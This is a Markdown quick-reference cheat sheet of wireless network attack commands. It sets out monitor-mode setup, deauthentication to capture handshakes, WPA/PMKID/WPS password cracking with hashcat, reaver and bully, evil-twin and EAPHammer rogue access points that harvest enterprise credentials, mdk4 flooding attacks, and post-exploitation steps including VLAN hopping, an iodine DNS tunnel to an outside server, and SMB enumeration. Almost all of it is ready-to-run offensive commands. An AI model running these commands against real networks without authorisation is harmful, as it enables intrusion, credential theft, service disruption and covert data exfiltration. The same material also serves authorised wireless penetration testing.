# Command Quick Reference

## Monitor Mode

```bash
airmon-ng check kill          # Kill interfering processes
airmon-ng start wlan0         # Start monitor mode
airmon-ng stop wlan0mon       # Stop monitor mode
iw dev wlan0 interface add mon0 type monitor && ip link set mon0 up  # Manual
```

## Reconnaissance

```bash
airodump-ng wlan0mon                    # Channel sweep
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Targeted
wash -i wlan0mon -C                     # WPS scan
hcxdumptool -i wlan0mon -o out.pcapng  # PMKID capture
```

## Handshake Capture

```bash
aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon   # Deauth client
aireplay-ng -0 0 -a <BSSID> wlan0mon                # Broadcast deauth
```

## Cracking

```bash
# WPA2/WPA3 handshake (unified format, hashcat 6.2.0+)
aircrack-ng -w wordlist.txt capture.cap
hcxpcapngtool -o capture.hc22000 capture.cap
hashcat -m 22000 capture.hc22000 wordlist.txt

# PMKID (clientless)
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22001 pmkid.hc22000 wordlist.txt

# WPS PIN
reaver -i wlan0mon -b <BSSID> -vv
bully wlan0mon -b <BSSID>

# MSCHAPv2 / NetNTLMv2 (Enterprise EAP harvest)
hashcat -m 5600 mschapv2.hash wordlist.txt
asleap -r capture.cap -w wordlist.txt
```

## Rogue AP

```bash
# hostapd-mana
hostapd-mana /etc/hostapd-mana/hostapd.conf

# EAPHammer
./eaphammer -i wlan0 --channel 6 --auth wpa2-eap --creds -e CorpWiFi

# airbase-ng (legacy)
airbase-ng -e "EvilTwin" -c 6 wlan0mon
```

## Protocol Attacks

```bash
aireplay-ng -0 5 -a <BSSID> wlan0mon     # Deauth
mdk4 wlan0mon d -b blacklist.txt          # Disassoc
mdk4 wlan0mon a -a <BSSID>                # Auth flood
mdk4 wlan0mon b -s 1000                   # Beacon flood
```

## Post-Exploitation

```bash
# VLAN hopping
ip link add link eth0 name eth0.100 type vlan id 100
ip link set eth0.100 up
dhclient eth0.100

# DNS tunnel
iodine -f -P pass dns.server.com

# SMB enum
enum4linux -a 192.168.1.0/24
```
